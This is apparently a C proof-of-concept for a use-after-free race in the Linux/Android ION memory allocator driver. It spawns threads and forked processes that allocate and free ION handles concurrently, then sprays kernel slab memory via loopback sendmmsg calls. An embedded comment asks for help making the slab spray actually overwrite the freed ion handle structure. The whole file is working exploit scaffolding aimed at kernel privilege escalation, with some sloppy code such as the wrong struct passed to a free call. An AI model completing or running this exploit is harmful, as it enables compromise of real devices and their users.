#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <linux/ion.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void* alloc_worker(void* arg) {
	int fd_ion = *(int*) arg;
    struct ion_allocation_data data = {
        .len = 1024,
        .align = 0,
        .heap_id_mask = 0xfffffffful,
        .flags = 0,
    };

    for (;;) {
    	data.handle = 0;
		if (ioctl(fd_ion, ION_IOC_ALLOC, &data) != 0) {
			perror("[-]alloc");
		} else if ((unsigned)data.handle >= 0x10000) {
			// try free the handle to test if it really UAF
			struct ion_handle_data free_data;
			free_data.handle = data.handle;
			if (ioctl(fd_ion, ION_IOC_FREE, &data) != 0)
				printf("[+]Found UAF! data.handle=0x%08x\n", (unsigned)data.handle);
		} if ((unsigned)data.handle > 4) {
			sleep(1);
		}
    }
    return NULL;
}

void* free_worker(void* arg) {
	int fd_ion = *(int*) arg;
    struct ion_handle_data data;
    for (;;) {
	    data.handle = rand() % 4;
	    ioctl(fd_ion, ION_IOC_FREE, &data);
    }
    return NULL;
}

/* HELP ME TO IMPROVE/REPLACE the following code
 * To boost the UAF, I copy the following code from github.
 * Buf I am not familiar with UAF/slab at all!
 * And I find the value 0xcccccccc is not filling the actual ion handle structure at all!
 * Need your help to do the actual filling in the slab for UAF
 */
static int
create_tcp_server_for_uaf(unsigned short port)
{
  int sockfd;
  int yes = 1;
  struct sockaddr_in addr = {0};

  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

  listen(sockfd, 1);

  return accept(sockfd, NULL, NULL);
}

static int
connect_server_socket(unsigned short port)
{
  int sockfd;
  struct sockaddr_in addr = {0};
  int ret;
  int sock_buf_size;

  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
  if (sockfd < 0) {
    printf("socket failed\n");
    usleep(10);
  }
  else {
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  }

  while (connect(sockfd, (struct sockaddr *)&addr, 16) < 0) {
    usleep(10);
  }

  sock_buf_size = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

  return sockfd;
}

#define ARRAY_SIZE(a)           (sizeof (a) / sizeof (*(a)))


void* fill_worker(void* arg) {
	int i;
	int sockfd;
	struct mmsghdr msgvec[1];
	struct iovec msg_iov[8];
	unsigned long databuf[0x20];
	int ret;
	unsigned short port = *(unsigned short*) arg;

	sockfd = connect_server_socket(port);
	printf("[*]server connected fd=%d\n", sockfd);

  	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
		databuf[i] = 0xccccccccul;
  	}

  	for (i = 0; i < ARRAY_SIZE(msg_iov); i++) {
    	msg_iov[i].iov_base = databuf;
    	msg_iov[i].iov_len = 0x20;
  	}

  msgvec[0].msg_hdr.msg_name = databuf;
  msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
  msgvec[0].msg_hdr.msg_iov = msg_iov;
  msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
  msgvec[0].msg_hdr.msg_control = databuf;
  msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
  msgvec[0].msg_hdr.msg_flags = 0;
  msgvec[0].msg_len = 0;

 
  ret = 0;

  while (1) {
    ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
    if (ret <= 0) {
    	perror("__NR_sendmmsg");
      	break;
    }
  }

	return NULL;
}

void single_proc(unsigned short port) {
	pthread_t th[5];
	int fd_ion = open("/dev/ion", O_RDONLY | O_DSYNC);
	if (fd_ion < 0) {
		perror("[-]open ion");
		return;
	}
	if (pthread_create(&th[0], NULL, alloc_worker, &fd_ion) < 0) {
		perror("[-]create alloc");
		return;
	}
	if (pthread_create(&th[1], NULL, free_worker, &fd_ion) < 0) {
		perror("[-]create free");
		return;
	}
	if (pthread_create(&th[2], NULL, free_worker, &fd_ion) < 0) {
		perror("[-]create free");
		return;
	}
	if (pthread_create(&th[3], NULL, fill_worker, &port) < 0) {
		perror("[-]create free");
		return;
	}
	if (create_tcp_server_for_uaf(port) < 0) {
		perror("[-]create tcp server");
		return;
	}
	
	for (;;) {
		sleep(100000);
	}	
}

int main() {
	int i;
	for (i=0; i<3; ++i) {
		if (fork()==0) {
			single_proc(9394+i);
			exit(0);
		}
	}
	single_proc(9397);
	return 0;
}
